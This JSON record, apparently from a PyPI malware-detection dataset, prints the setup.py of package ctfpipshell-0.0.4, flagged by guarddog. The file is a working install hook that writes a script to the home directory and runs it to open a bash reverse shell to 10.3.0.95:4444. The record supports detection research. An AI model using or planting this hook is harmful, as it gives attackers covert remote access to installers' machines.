[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport subprocess\nfrom setuptools.command.install import install\n\nCode = '''\nimport os\nos.system(\"bash -i >& /dev/tcp/10.3.0.95/4444 0>&1\")\n'''\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass"
  },
  {
    "metadata": {
      "package_name": "ctfpipshell-0.0.4",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/ctfpipshell-0.0.4.txt"
    }
  }
]